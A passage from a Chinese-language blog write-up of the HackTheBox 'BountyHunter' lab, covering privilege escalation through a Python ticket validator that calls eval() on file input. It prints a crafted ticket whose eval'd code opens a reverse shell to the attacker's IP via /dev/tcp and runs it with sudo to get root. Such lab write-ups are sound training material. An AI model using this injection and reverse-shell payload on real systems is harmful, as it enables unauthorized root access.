+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">ticketFile</span>):<br>    <span class="hljs-comment">#Evaluates a ticket to check for ireggularities.</span><br>    code_line = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> i,x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ticketFile.readlines()):<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.startswith(<span class="hljs-string">&quot;# Skytrain Inc&quot;</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.startswith(<span class="hljs-string">&quot;## Ticket to &quot;</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Destination: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27; &#x27;</span>.join(x.strip().split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">3</span>:])&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> x.startswith(<span class="hljs-string">&quot;__Ticket Code:__&quot;</span>):<br>            code_line = i+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> code_line <span class="hljs-keyword">and</span> i == code_line:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.startswith(<span class="hljs-string">&quot;**&quot;</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            ticketCode = x.replace(<span class="hljs-string">&quot;**&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;+&quot;</span>)[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(ticketCode) % <span class="hljs-number">7</span> == <span class="hljs-number">4</span>:<br>                validationNumber = <span class="hljs-built_in">eval</span>(x.replace(<span class="hljs-string">&quot;**&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br></code></pre></td></tr></table></figure>
+
+
+
+<p>逻辑很好理解，我们需要根据代码执行逻辑一步步走直到<code>eval</code>被执行。于是最后的payload如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Skytrain Inc</span><br><span class="hljs-comment">## Ticket to </span><br>__Ticket Code:__<br>**11+10==__import__(<span class="hljs-string">&#x27;subprocess&#x27;</span>).call(<span class="hljs-string">&quot;echo &#x27;sh -i &gt;&amp; /dev/tcp/10.10.14.46/2333 0&gt;&amp;1&#x27;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x&quot;</span>,shell=True)<br></code></pre></td></tr></table></figure>
+
+<p>执行命令并开启监听，即可拿到shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py<br></code></pre></td></tr></table></figure>
+
+<p>拿到root的shell后在家目录下即可拿到secret：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905160136136.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905160136136"></p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/102748376">https://blog.csdn.net/whatday/article/details/102748376</a></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HackTheBox/">#HackTheBox</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox - BountyHunter</div>
+      <div>https://m0ck1ng-b1rd.github.io/2021/12/07/HTB/BountyHunter/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何语灵</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年12月7日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/13/HTB/Seal/" title="HackTheBox - Seal">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox - Seal</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/07/HTB/Cap/" title="HackTheBox - Cap">
+                        <span class="hidden-mobile">HackTheBox - Cap</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
